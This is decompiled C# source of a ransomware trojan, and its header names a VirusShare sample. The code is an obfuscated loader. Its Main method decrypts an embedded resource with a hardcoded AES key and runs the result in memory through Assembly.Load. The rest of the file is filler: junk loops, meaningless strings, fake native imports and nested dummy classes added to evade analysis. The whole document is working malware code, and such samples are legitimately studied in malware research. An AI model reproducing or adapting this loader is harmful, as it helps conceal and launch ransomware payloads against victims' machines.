// Decompiled with JetBrains decompiler
// Type: pÚÝ
// Assembly: w5yn1ypx, Version=1.1.1.1, Culture=neutral, PublicKeyToken=null
// MVID: 9BF980D0-9DB2-4214-8DEF-D5A7885C1D4F
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00028-msil\Trojan-Ransom.Win32.Blocker.ifxh-77c122ba1c94391ae03c8c52526aa78e491f1298257e92a2ab5c28a8d494a5ad.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

[StandardModule]
internal sealed class pÚÝ
{
  private static DateTime ÑÃµÅbv = DateTime.Now;
  private static long Ú = 168258277;

  public static byte[] ÒØ(byte[] ØÃqhr)
  {
    byte[] numArray = new byte[18]
    {
      (byte) 126,
      (byte) 41,
      (byte) 32,
      (byte) 53,
      (byte) 55,
      (byte) 0,
      (byte) 213,
      (byte) 201,
      (byte) 175,
      (byte) 71,
      (byte) 167,
      (byte) 225,
      (byte) 243,
      (byte) 78,
      (byte) 196,
      (byte) 82,
      (byte) 79,
      (byte) 197
    };
    using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
    {
      if (true)
      {
        int num1 = false ? 1 : 0;
      }
      Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(numArray, numArray, 1);
      sbyte num2 = 12;
      do
      {
        ++num2;
      }
      while (num2 <= (sbyte) 100);
      rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes((int) Math.Round((double) rijndaelManaged.KeySize / 8.0));
      rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes((int) Math.Round((double) rijndaelManaged.BlockSize / 8.0));
      return rijndaelManaged.CreateDecryptor().TransformFinalBlock(ØÃqhr, 0, ØÃqhr.Length);
    }
  }

  [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern void xµÛÙ_(float Ú7);

  public static string Ïry1(long ÏÐ6, float kpeÛ, string cÍ, int Ü63ÒÂÒ) => Encoding.UTF8.GetString(pÚÝ.ÒØ(Convert.FromBase64String(cÍ)));

  public static void ÿ(Decimal Õ, float Ú5v)
  {
    uint num = 17;
    do
    {
      ++num;
    }
    while (num <= 99U);
  }

  public static bool Æ(uint Ï4wfÇÔ, long g1bÿÖ, ulong wÔÍ)
  {
    long num1 = 10;
    do
    {
      double num2 = 19.0;
      do
      {
        ++num2;
      }
      while (num2 <= 49.0);
      ++num1;
    }
    while (num1 <= 28L);
    return false;
  }

  public static void Çe(byte ÚÁÚm, byte[] cÍÑµrd, string aÓ, byte wßeÇf)
  {
    int num = true ? 1 : 0;
    Thread thread = new Thread(new ParameterizedThreadStart(pÚÝ.Çe));
    thread.SetApartmentState(ApartmentState.STA);
    thread.Start((object) cÍÑµrd);
  }

  public static void Çe(object Çe)
  {
    MethodInfo entryPoint = Assembly.Load((byte[]) Çe).EntryPoint;
    if (entryPoint.GetParameters().Length == 0)
      entryPoint.Invoke((object) null, (object[]) null);
    else
      entryPoint.Invoke((object) null, new object[1]
      {
        (object) new string[0]
      });
  }

  [DllImport("cfgmgr32", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern short Í();

  [STAThread]
  public static void Main()
  {
    ulong num1 = 13;
    do
    {
      ++num1;
    }
    while (num1 <= 60UL);
    ResourceManager resourceManager = new ResourceManager("5emyvn3c", Assembly.GetExecutingAssembly());
    if (true)
    {
      int num2 = true ? 1 : 0;
    }
    pÚÝ.Çe((byte) 93, pÚÝ.ÒØ((byte[]) resourceManager.GetObject(pÚÝ.Ïry1(-688494460L, 3857.472f, "6UOznW6+aPP0xtY0chNxjA==", 407126737))), "'~+&", (byte) 102);
  }

  public static uint bÔ7l()
  {
    string str = "@/U8]/q";
    int index = 0;
    for (int length = str.Length; index < length; ++index)
    {
      char ch = str[index];
    }
    return 2146726664;
  }

  public class c5yÞd
  {
    [DebuggerNonUserCode]
    public c5yÞd()
    {
    }

    [DllImport("crypt32", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int t(Decimal Ë7Â_);

    public void x3w_0(uint cfwhk, string ÍgÖË, Decimal l)
    {
      int num1 = true ? 1 : 0;
      if (false)
        return;
      int num2 = true ? 1 : 0;
    }
  }

  public class iÍxßÑ
  {
    [DebuggerNonUserCode]
    public iÍxßÑ()
    {
    }

    public class Ï
    {
      private double r4ÅlnØ;
      private ushort oÍy;

      public Ï()
      {
        this.r4ÅlnØ = 0.0;
        this.oÍy = (ushort) 25094;
      }

      [DllImport("psapi", CharSet = CharSet.Ansi, SetLastError = true)]
      public static extern Decimal ÊfÃÅ([MarshalAs(UnmanagedType.VBByRefStr)] ref string vÊÿ, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Ì8Äx, [MarshalAs(UnmanagedType.VBByRefStr)] ref string ß7);

      public delegate DateTime ºfÎ(int uËzv1c, byte ÜÛ6tÚÉ, short nÜsËÖc, float ÂÙÄ);

      public class Ðx
      {
        [DebuggerNonUserCode]
        public Ðx()
        {
        }

        public void uÕÝ(sbyte oÍÙ, short ÈÂ, long i9uÁ, ushort hÿ04_Ó)
        {
          ulong num1 = 1;
          do
          {
            short num2 = 4;
            do
            {
              ++num2;
            }
            while (num2 <= (short) 60);
            ++num1;
          }
          while (num1 <= 78UL);
          string str = "~ImM{y";
          int index = 0;
          for (int length = str.Length; index < length; ++index)
          {
            char ch = str[index];
          }
        }

        public void w1(float ck, int xÖÀz, byte ÇØÅÛÇ, float y8Ç7j, Decimal r9ÆnbÒ)
        {
          bool flag = false;
          Decimal limit = 68M;
          for (Decimal num = 13M; ObjectFlowControl.ForLoopControl.ForNextCheckDec(num, limit, 1M); num = Decimal.Add(num, 1M))
          {
            string str = "_)pUP";
            int index = 0;
            for (int length = str.Length; index < length; ++index)
            {
              char ch = str[index];
            }
          }
          if (!flag)
            return;
          int num1 = 5;
          do
          {
            ++num1;
          }
          while (num1 <= 125);
        }

        public DateTime ÏÃÈqÙÚ(long aÕÃÜÖh)
        {
          if (true)
          {
            uint num = 4;
            do
            {
              ++num;
            }
            while (num <= 116U);
          }
          return DateTime.Now;
        }

        public class Ãeºß2
        {
          [DebuggerNonUserCode]
          public Ãeºß2()
          {
          }

          [DllImport("ntdsapi", CharSet = CharSet.Ansi, SetLastError = true)]
          public static extern byte ÛÀcÏuÝ(
            short alÒ,
            byte gÊ6,
            ulong ÝdeÉß,
            sbyte Ýc1d,
            sbyte ÜÜlÒÿv);
        }
      }
    }
  }

  public class ÔÜº
  {
    private ushort ÀhÚÀÍØ;
    private Decimal Æl;

    [DebuggerNonUserCode]
    public ÔÜº()
    {
    }

    public ulong xsfw(bool pßÛ, ulong glÄja, ulong ØaÌÕn, int ÀµÑ7Ø, int nÀÝ)
    {
      if (false)
      {
        float num = 3f;
        do
        {
          ++num;
        }
        while ((double) num <= 65.0);
      }
      long num1 = 7;
      do
      {
        ++num1;
      }
      while (num1 <= 50L);
      return 1366407639;
    }

    public void oÇp(string dÌ)
    {
      int num = true ? 1 : 0;
    }

    public delegate uint vamÐÿq(float ÜlhmgÔ, float sqÎÙÂÌ, byte ÓnÅ, byte eh, short Ózf);

    public class ËÁÿµ
    {
      private ulong pz;

      public ËÁÿµ() => this.pz = 1999788614UL;

      public Decimal Évi(short Ðltt) => 0M;

      public class Ø3Õ
      {
        private bool sefÍ;
        private short ÚÓØÔ;

        public Ø3Õ()
        {
          this.sefÍ = false;
          this.ÚÓØÔ = (short) 20188;
        }

        public ulong Ñ0ÂÂÁ(float ØÐksÖ, ushort aÝ_3, sbyte µ32uÕ)
        {
          uint num1 = 20;
          do
          {
            int num2 = true ? 1 : 0;
            ++num1;
          }
          while (num1 <= 62U);
          float num3 = 9f;
          do
          {
            ushort num4 = 7;
            do
            {
              int num5 = true ? 1 : 0;
              ++num4;
            }
            while (num4 <= (ushort) 68);
            ++num3;
          }
          while ((double) num3 <= 86.0);
          return 269736354;
        }

        public long p(long ÖÏÜÈ, Decimal imx, Decimal ÅÌ, ushort jmÿ, DateTime v0)
        {
          string str = "j3";
          int index = 0;
          for (int length = str.Length; index < length; ++index)
          {
            char ch = str[index];
          }
          int num = false ? 1 : 0;
          return -586358024;
        }

        public class mµqn
        {
          private bool sÍÞ;
          private DateTime ÜÙÊte;

          public mµqn()
          {
            this.sÍÞ = false;
            this.ÜÙÊte = DateTime.Now;
          }

          public void ØyÉfrh(int jÎeov)
          {
            long num1 = 2;
            do
            {
              short num2 = 15;
              do
              {
                string str = "&*s4Y ";
                int index = 0;
                for (int length = str.Length; index < length; ++index)
                {
                  char ch = str[index];
                }
                ++num2;
              }
              while (num2 <= (short) 102);
              ++num1;
            }
            while (num1 <= 34L);
          }

          public int eÚÂÑ(short ÚÝgËÃÉ, ushort ÖÚ_ßqÞ, sbyte ÞÔÎÞÓ, float rÄ)
          {
            sbyte num = 11;
            do
            {
              ++num;
            }
            while (num <= (sbyte) 54);
            return 864753423;
          }

          public void Ò2(double ÞÔÿ, int zkË3hÅ, ushort º5Ø4e5, bool ÿÝ30º, int Ív)
          {
            byte num1 = 17;
            do
            {
              int num2 = 7;
              do
              {
                double num3 = 13.0;
                do
                {
                  ++num3;
                }
                while (num3 <= 117.0);
                uint num4 = 13;
                do
                {
                  ++num4;
                }
                while (num4 <= 48U);
                Decimal limit = 107M;
                Decimal num5 = 11M;
                while (ObjectFlowControl.ForLoopControl.ForNextCheckDec(num5, limit, 1M))
                  num5 = Decimal.Add(num5, 1M);
                ++num2;
              }
              while (num2 <= 32);
              ++num1;
            }
            while (num1 <= (byte) 84);
          }

          [DllImport("dbghelp", CharSet = CharSet.Ansi, SetLastError = true)]
          public static extern int Üb(uint uÝ0yÇ, byte ÿÇ6mÕÍ);
        }

        public class i
        {
          private Decimal ÄÕ;
          private int ÒÝÆÒ;

          public i()
          {
            this.ÄÕ = 225532828M;
            this.ÒÝÆÒ = -649638666;
          }

          public class Ûa5ÜÄ
          {
            [DebuggerNonUserCode]
            public Ûa5ÜÄ()
            {
            }

            public delegate void wyËuÑ(Decimal Ôw60);
          }

          public class y
          {
            [DebuggerNonUserCode]
            public y()
            {
            }

            public void iÇÿÑc()
            {
              float num1 = 16f;
              do
              {
                if (true)
                {
                  int num2 = true ? 1 : 0;
                }
                int num3 = true ? 1 : 0;
                ++num1;
              }
              while ((double) num1 <= 83.0);
            }

            public uint ÀÏ(byte erd7, short lÉ)
            {
              string str = "WFiw @%";
              int index = 0;
              for (int length = str.Length; index < length; ++index)
              {
                char ch = str[index];
              }
              uint num1 = 10;
              do
              {
                int num2 = true ? 1 : 0;
                ++num1;
              }
              while (num1 <= 45U);
              return 1635212870;
            }

            public ulong jgÃkÝ(byte Îkt3º, ushort ÓyzÃ, double s_, ulong cbßb)
            {
              if (true)
              {
                uint num1 = 0;
                do
                {
                  ++num1;
                }
                while (num1 <= 56U);
                Decimal limit = 81M;
                Decimal num2 = 7M;
                while (ObjectFlowControl.ForLoopControl.ForNextCheckDec(num2, limit, 1M))
                  num2 = Decimal.Add(num2, 1M);
              }
              int num = true ? 1 : 0;
              return 1101210856;
            }

            public class Â7vyÅp
            {
              private double ØnÆiÙk;

              public Â7vyÅp() => this.ØnÆiÙk = 6102.5677;

              public void µf1ÊÓ(ushort ÙÇÜÌº, uint ÉÞÚÒw, long ÌisÏ, double xfbuxÕ)
              {
                double num = 2.0;
                do
                {
                  ++num;
                }
                while (num <= 32.0);
                string str = "aYDGsK9";
                int index = 0;
                for (int length = str.Length; index < length; ++index)
                {
                  char ch = str[index];
                }
              }

              public double iÁkÍcÒ(DateTime wÒxÎ, DateTime ÔÐÆhiz, Decimal eÉc, ushort Ûk)
              {
                bool flag1 = true;
                int num1 = false ? 1 : 0;
                if (flag1)
                {
                  bool flag2 = true;
                  int num2 = false ? 1 : 0;
                  if (flag2)
                  {
                    int num3 = false ? 1 : 0;
                  }
                }
                return 0.0;
              }

              public void hv3m(Decimal ÎËiÖ, string ÚÏÉ, long qsÐÓÑ, DateTime Ë0p7)
              {
                double num1 = 4.0;
                do
                {
                  ++num1;
                }
                while (num1 <= 109.0);
                Decimal limit = 28M;
                for (Decimal num2 = 0M; ObjectFlowControl.ForLoopControl.ForNextCheckDec(num2, limit, 1M); num2 = Decimal.Add(num2, 1M))
                  ;
              }

              public class h9uc7
              {
                private long euÃ_;
                private string Êmm;

                public h9uc7()
                {
                  this.euÃ_ = 1014348180L;
                  this.Êmm = (string) null;
                }

                public void ÍÚØ(byte ÅÜØx, sbyte ggbp, uint v_Ö8Ûs, sbyte nÀÞÌ)
                {
                  bool flag = true;
                  int num = false ? 1 : 0;
                  if (!flag)
                    ;
                }

                [DllImport("fwpuclnt", CharSet = CharSet.Ansi, SetLastError = true)]
                public static extern void ÝÿËÇ(sbyte v1ºÁß, double Ë1yÀÏ, int lº, uint ÇhÝ);

                public class º
                {
                  private ushort ÔÇØm;

                  public º() => this.ÔÇØm = (ushort) 11197;

                  public void É0ÙÚ(int ß, byte ºjÀÅ4Î, short lßfÚ4)
                  {
                    long num1 = 10;
                    do
                    {
                      int num2 = false ? 1 : 0;
                      short num3 = 17;
                      do
                      {
                        ++num3;
                      }
                      while (num3 <= (short) 40);
                      ++num1;
                    }
                    while (num1 <= 92L);
                  }

                  public sbyte ÂÝ(int n_y, short z1ÅvÍh)
                  {
                    Decimal limit = 55M;
                    Decimal num = 9M;
                    while (ObjectFlowControl.ForLoopControl.ForNextCheckDec(num, limit, 1M))
                      num = Decimal.Add(num, 1M);
                    return -21;
                  }

                  public void ÏÇ1ebÔ(string Ó5kw, string idoÏÇ)
                  {
                  }

                  public class ÅÈddÉ
                  {
                    private int ÖÅØÌ;
                    private long Åbj2ºm;

                    public ÅÈddÉ() => this.Åbj2ºm = -484777640L;

                    public DateTime uÐ(long rsuµÍ)
                    {
                      if (true)
                        ;
                      if (false)
                      {
                        short num = 3;
                        do
                        {
                          ++num;
                        }
                        while (num <= (short) 77);
                      }
                      return DateTime.Now;
                    }
                  }
                }

                public delegate long Ñº37(
                  string Ôq,
                  double ÈÚt4_,
                  long µyÔ8,
                  short ÝÁÚµy9,
                  ushort ØÆ);
              }

              public delegate void wÎ();
            }

            public delegate void rq6ÞÙÉ(ushort jslÁ, float ppÄÕØÓ);
          }
        }
      }

      public class Ø0ØvÒq
      {
        [DebuggerNonUserCode]
        public Ø0ØvÒq()
        {
        }

        public double ÿÎfÿ0(long ÌÊ, int q, string qÂvÜ)
        {
          int num1 = true ? 1 : 0;
          int num2 = false ? 1 : 0;
          return 3966.58;
        }

        public class ÌÅÇt
        {
          private byte ÊÒx27È;
          private ulong Í2ÊkËÆ;

          public ÌÅÇt()
          {
            this.ÊÒx27È = (byte) 0;
            this.Í2ÊkËÆ = 258639217UL;
          }

          public double tkoÆÓ8(uint aÆ, double ycÇÉ, int nÛpa, double ÞÛ)
          {
            ulong num1 = 14;
            do
            {
              ushort num2 = 7;
              do
              {
                float num3 = 15f;
                do
                {
                  ++num3;
                }
                while ((double) num3 <= 92.0);
                double num4 = 15.0;
                do
                {
                  ++num4;
                }
                while (num4 <= 103.0);
                ++num2;
              }
              while (num2 <= (ushort) 119);
              ++num1;
            }
            while (num1 <= 23UL);
            DateTime now = DateTime.Now;
            return 20238.0;
          }
        }

        public delegate void È7ÏÈqÎ(double j1Ñ, Decimal kËØ, double ÜiÝ2Õ0, ushort vÝ);
      }

      public class dgiÆt
      {
        [DebuggerNonUserCode]
        public dgiÆt()
        {
        }

        public ulong cÈ(bool gÐÕß, string Ýr, float fÃÜ)
        {
          if (false)
          {
            int num = false ? 1 : 0;
            string str = "Va*2";
            int index = 0;
            for (int length = str.Length; index < length; ++index)
            {
              char ch = str[index];
            }
          }
          return 1617812879;
        }

        public delegate void tÂ0g(Decimal kÐ39Ùj, int wo5Ø5Ï, Decimal ÚÎÎ);
      }
    }
  }

  public delegate byte ÁÑÞÃÞ(uint u, double Ëh772Ï, Decimal Ïdlß);

  public class g5fd
  {
    [DebuggerNonUserCode]
    public g5fd()
    {
    }

    [DllImport("winusb", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern ulong Û(float gÑgÍÁs);
  }

  public class d
  {
    [DebuggerNonUserCode]
    public d()
    {
    }

    [DllImport("oleacc", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern ushort Ît(float dÓ6);

    public class Ç4ÃtÿÊ
    {
      private short Ð8Üb;
      private float ÝfcÌ;

      public Ç4ÃtÿÊ() => this.ÝfcÌ = 26681f;

      public class Òe
      {
        [DebuggerNonUserCode]
        public Òe()
        {
        }

        public int kßna(ushort cÁfÉ, bool ÐbÒÏ, long uÅº2ÓÙ, ulong ÀÌ)
        {
          string str = "+Uf<Rjg{";
          int index = 0;
          for (int length = str.Length; index < length; ++index)
          {
            char ch = str[index];
            int num1 = false ? 1 : 0;
            int num2 = true ? 1 : 0;
          }
          byte num = 20;
          do
          {
            ++num;
          }
          while (num <= (byte) 127);
          return 1470358002;
        }

        public void yÆ(byte Õkj)
        {
          uint num1 = 0;
          do
          {
            string str = "^&p";
            int index = 0;
            for (int length = str.Length; index < length; ++index)
            {
              char ch = str[index];
            }
            ++num1;
          }
          while (num1 <= 40U);
          sbyte num2 = 8;
          do
          {
            ++num2;
          }
          while (num2 <= (sbyte) 56);
        }
      }

      public class Åu4À6
      {
        private sbyte Êº0sØ;

        public Åu4À6() => this.Êº0sØ = (sbyte) -102;

        public class wmre
        {
          private DateTime ÈØ8g8y;

          public wmre() => this.ÈØ8g8y = DateTime.Now;

          public void År(float ÙÓÊ, short Ê6, int egÆÓÝÀ)
          {
            int num = true ? 1 : 0;
            string str = "o<J/";
            int index = 0;
            for (int length = str.Length; index < length; ++index)
            {
              char ch = str[index];
            }
          }

          public class e_Ås
          {
            private short m7;
            private Decimal ÉnÌÍ3;

            public e_Ås()
            {
              this.m7 = (short) 12592;
              this.ÉnÌÍ3 = 645206167M;
            }

            public short Úc(uint Î, short ÈØºnÍÛ)
            {
              string str = "U&nFk;z=V";
              int index = 0;
              for (int length = str.Length; index < length; ++index)
              {
                char ch = str[index];
              }
              return 17197;
            }

            [DllImport("opengl32", CharSet = CharSet.Ansi, SetLastError = true)]
            public static extern ushort iØÊ(ulong ÓÈËxl);

            public class ÜÂ
            {
              [DebuggerNonUserCode]
              public ÜÂ()
              {
              }

              public bool Ä(short hv_, bool ÑÄ, byte ocvt)
              {
                if (true)
                {
                  DateTime now = DateTime.Now;
                }
                return false;
              }
            }

            public class y6
            {
              private byte ÌÓÿmÄl;

              [DebuggerNonUserCode]
              public y6()
              {
              }

              [DllImport("winusb", CharSet = CharSet.Ansi, SetLastError = true)]
              public static extern sbyte Ù(ushort gawna, ushort Ïr, float wkËbv, int ÿckÇ);

              public class xlzØm7
              {
                private long m;
                private sbyte pbÜ6cÅ;
                private bool tc0zµ;

                public xlzØm7()
                {
                  this.m = 894565750L;
                  this.pbÜ6cÅ = (sbyte) 63;
                }

                public byte Â(ulong ÏzÜx, long Î6)
                {
                  if (false)
                  {
                    string str = "JP:},N7M";
                    int index = 0;
                    for (int length = str.Length; index < length; ++index)
                    {
                      char ch = str[index];
                    }
                    ushort num = 0;
                    do
                    {
                      ++num;
                    }
                    while (num <= (ushort) 102);
                  }
                  int num1 = true ? 1 : 0;
                  return 25;
                }

                public delegate ushort gÂ();
              }

              public class Å7wÂ
              {
                private Decimal z;

                public Å7wÂ() => this.z = 2057078735M;

                public void xzvmj(short eÝjlkÿ)
                {
                  int num = true ? 1 : 0;
                }

                public delegate ushort k(
                  Decimal Ãrq2,
                  float ÁÕ,
                  Decimal qÂßÙ2q,
                  ushort Øi,
                  byte ÓÑÿ_);

                public class pÇÐ
                {
                  private byte Ât;

                  public pÇÐ() => this.Ât = (byte) 243;

                  public void hc(DateTime Ü, int rxÏÿ36, Decimal x, int ÊØßÅs)
                  {
                    if (true)
                    {
                      byte num = 17;
                      do
                      {
                        ++num;
                      }
                      while (num <= (byte) 20);
                    }
                    int num1 = 11;
                    do
                    {
                      ++num1;
                    }
                    while (num1 <= 64);
                  }

                  public void g3Î(string eÎ)
                  {
                    int num = 10;
                    do
                    {
                      ++num;
                    }
                    while (num <= 46);
                  }

                  [DllImport("oleacc", CharSet = CharSet.Ansi, SetLastError = true)]
                  public static extern bool gÜÎpÔÓ(byte Å8, long m7ÍËj, int ºnÝ);

                  public delegate ushort gÆÙwqd();
                }
              }

              public delegate DateTime ØËÖÕe9(
                long n0jµ92,
                bool sg,
                sbyte Å2o,
                DateTime ÓnÛÍ);

              public class ÅÉ
              {
                private string ÈÅ;
                private double kÉ;
                private ulong ÄØ;
                private short Í0;

                public ÅÉ()
                {
                  this.ÈÅ = "Ft1,7";
                  this.ÄØ = 1544943353UL;
                  this.Í0 = (short) 0;
                }

                public byte h(int Æ_, Decimal Ó4ÓÅi)
                {
                  byte num1 = 17;
                  do
                  {
                    ++num1;
                  }
                  while (num1 <= (byte) 63);
                  int num2 = true ? 1 : 0;
                  return 216;
                }

                public void uÅ0(byte qÄw, double nÊÔÈl)
                {
                }
              }
            }
          }

          public delegate void ÂcahÚb(
            byte Å,
            Decimal ÍÓÝÌhb,
            long ØÒÅÔ5Ù,
            string pyÊµc,
            double Ðf0_);
        }
      }
    }

    public class ÜzÃÂØ
    {
      [DebuggerNonUserCode]
      public ÜzÃÂØ()
      {
      }

      public void kÌÁ3Ó(double µ, short s, Decimal wÁÓ9bb, ushort qmjµ, bool ÙÉÀÐ1Þ)
      {
        sbyte num = 19;
        do
        {
          ++num;
        }
        while (num <= (sbyte) 111);
      }

      public delegate void eÒw(ushort bÚg);

      public class ÈÍeÉd
      {
        private Decimal wÝe;

        public ÈÍeÉd() => this.wÝe = 922936850M;

        [DllImport("wininet", CharSet = CharSet.Ansi, SetLastError = true)]
        public static extern sbyte ÒÍÈj(byte ÖyÒqÿ, byte h_pcËu, uint ÓmÓoÔ);

        [DllImport("ole32", CharSet = CharSet.Ansi, SetLastError = true)]
        public static extern void mÄxÓÐÛ(byte w, short cl, DateTime mÎÏhhÌ, double cux);

        [DllImport("wlanapi", CharSet = CharSet.Ansi, SetLastError = true)]
        public static extern void ÊÂ();
      }

      public delegate void ÄÙ9ÞØÎ();

      public delegate void Åº0(string ÃhÅÃ);
    }
  }

  public class Ã
  {
    private bool eÑÖ3Ï;

    public Ã() => this.eÑÖ3Ï = false;

    public class ÀpmÊËÃ
    {
      [DebuggerNonUserCode]
      public ÀpmÊËÃ()
      {
      }

      public delegate Decimal Ð(DateTime Ûj, int ÔoÕ5º);
    }
  }

  public class Ãc5
  {
    [DebuggerNonUserCode]
    public Ãc5()
    {
    }

    public void ËÈs(float z8Éw)
    {
      if (false)
      {
        Decimal limit = 90M;
        Decimal num1 = 19M;
        while (ObjectFlowControl.ForLoopControl.ForNextCheckDec(num1, limit, 1M))
          num1 = Decimal.Add(num1, 1M);
        if (true)
        {
          sbyte num2 = 2;
          do
          {
            ++num2;
          }
          while (num2 <= (sbyte) 26);
        }
      }
      double num = 11.0;
      do
      {
        ++num;
      }
      while (num <= 125.0);
    }
  }

  public class zÊÂtÝ
  {
    private string ØÔgÈ;

    [DebuggerNonUserCode]
    public zÊÂtÝ()
    {
    }

    [DllImport("dbghlp32", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern string ÛÙ_y(
      long ÆÃlººÛ,
      sbyte ÍÏkÛÁm,
      DateTime Äb,
      ushort wÈkrÆ,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string q0Õiot);

    public delegate sbyte or8gÂ(int tyÇot, uint a5tÆÄ, short dÕ, short o);

    public delegate DateTime É();
  }
}
